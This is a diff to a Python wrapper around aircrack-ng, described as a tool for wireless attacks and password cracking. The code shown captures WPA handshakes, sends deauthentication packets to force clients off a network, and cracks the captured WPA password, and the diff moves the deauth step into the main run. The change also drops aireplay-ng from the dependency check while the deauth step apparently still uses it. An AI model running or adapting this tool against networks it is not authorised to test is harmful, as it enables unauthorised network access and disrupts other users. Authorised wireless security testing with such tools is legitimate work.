@@ -51,7 +51,6 @@ class CommandRunner:
             logging.error(f"Command failed: {e}")
         return None
 
-# Check if command was successful, print message
     def check(self, result, success_message=None, failure_message=None):
         if result and result.returncode == 0:
             if success_message:
@@ -64,7 +63,6 @@ class CommandRunner:
 
 # Wrapper-class with wireless attacks and password cracking
 class AircrackNGWrapper:
-    
     def __init__(self, runner: CommandRunner):
         self.runner = runner
         self.interface = None
@@ -130,11 +128,34 @@ class AircrackNGWrapper:
             return True
         return False
 
+    def capture_handshake(self):
+        cmd = self.build_airodump_cmd()
+        logging.info(f"Starting handshake capture on BSSID {self.bssid}, channel {self.channel}...")
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.wait_for_handshake(process)
+
+    def wait_for_handshake(self, process):
+        start_time = time.time()
+        while time.time() - start_time < self.handshake_timeout:
+            capture_file_path = f"{self.capture_file}-01.cap"
+            if os.path.exists(capture_file_path) and self.is_handshake_captured():
+                logging.info("Handshake captured!")
+                process.terminate()
+                return True
+            time.sleep(5)
+        process.terminate()
+        logging.error("Handshake not captured within the timeout period.")
+        exit(1)
+
+    def is_handshake_captured(self):
+        result = self.runner.run(['aircrack-ng', '-a2', '-w', '/dev/null', f"{self.capture_file}-01.cap"])
+        return result and "1 handshake" in result.stdout
+
     def capture_clients(self):
+        """Capture connected clients from the airodump-ng output."""
         cmd = ['sudo', 'airodump-ng', '--bssid', self.bssid, '--channel', self.channel, self.interface]
-        result = self.runner.run(cmd, timeout=10)
+        result = self.runner.run(cmd, timeout=30)  # Increased timeout
         if result:
-            # Parsing the output to find client BSSIDs
             client_bssids = []
             for line in result.stdout.splitlines():
                 if self.bssid in line and len(line.split()) > 1:
@@ -147,43 +168,9 @@ class AircrackNGWrapper:
         else:
             logging.error("Failed to capture clients.")
 
-    def capture_handshake(self):
-        cmd = self.build_airodump_cmd()
-        logging.info(f"Starting handshake capture on BSSID {self.bssid}, channel {self.channel}...")
-        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        # Wait for handshake, with deauth attempt if no handshake is captured within a certain time
-        if not self.wait_for_handshake(process):
-            logging.warning("No handshake captured, attempting deauth attack to force a handshake.")
-            if not self.client_bssid:
-                logging.info("Attempting to capture connected clients for deauth attack...")
-                self.capture_clients()  # Automatically capture clients if not provided
-            if self.client_bssid:
-                self.deauth_client()  # Perform deauth attack
-                # Attempt handshake capture again after deauth
-                if not self.wait_for_handshake(process):
-                    logging.error("Handshake not captured after deauth attack.")
-                    process.terminate()
-                    exit(1)
-        
-        process.terminate()
-
-    def wait_for_handshake(self, process):
-        start_time = time.time()
-        while time.time() - start_time < self.handshake_timeout:
-            if os.path.exists(f"{self.capture_file}-01.cap") and self.is_handshake_captured():
-                logging.info("Handshake captured!")
-                return True
-            time.sleep(5)
-        return False
-
-    def is_handshake_captured(self):
-        result = self.runner.run(['aircrack-ng', '-a2', '-w', '/dev/null', f"{self.capture_file}-01.cap"])
-        return result and "1 handshake" in result.stdout
-
     def deauth_client(self):
         if not self.client_bssid:
-            return  # Deauth attack is optional and skipped if no client is available
+            return  # Deauth attack is optional
         
         for attempt in range(3):
             logging.info(f"Attempt {attempt + 1}: Sending deauth packets to {self.client_bssid}...")
@@ -226,6 +213,7 @@ class AircrackNGWrapper:
         user_input = input(f"{prompt} (default: {default})" if default else f"{prompt}: ").strip()
         return user_input or default
 
+
 # Argument parser for command-line arguments
 def parse_args():
     parser = argparse.ArgumentParser(description="Aircrack-ng Wrapper")
@@ -238,13 +226,15 @@ def parse_args():
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode (debug-level logging).")
     return parser.parse_args()
 
+
 # Pre-check for necessary tools
 def check_dependencies():
-    required_tools = ['airmon-ng', 'airodump-ng', 'aircrack-ng', 'aireplay-ng']
+    required_tools = ['airmon-ng', 'airodump-ng', 'aircrack-ng']
     for tool in required_tools:
         if not shutil.which(tool):
             logging.error(f"{tool} is not installed. Please install it before running the script.")
             exit(1)
+
 
 # Main execution
 if __name__ == "__main__":
@@ -261,6 +251,10 @@ if __name__ == "__main__":
         if not wrapper.verify_monitor_mode():
             logging.error("Failed to verify monitor mode.")
             exit(1)
+
+        if wrapper.client_bssid:
+            wrapper.capture_clients()  # Capture clients to attempt deauth attack
+            wrapper.deauth_client()  # Optional: Perform deauth attack if client BSSID is provided
 
         wrapper.capture_handshake()  # Capture WPA handshake
         wrapper.crack_password()  # Crack the WPA password
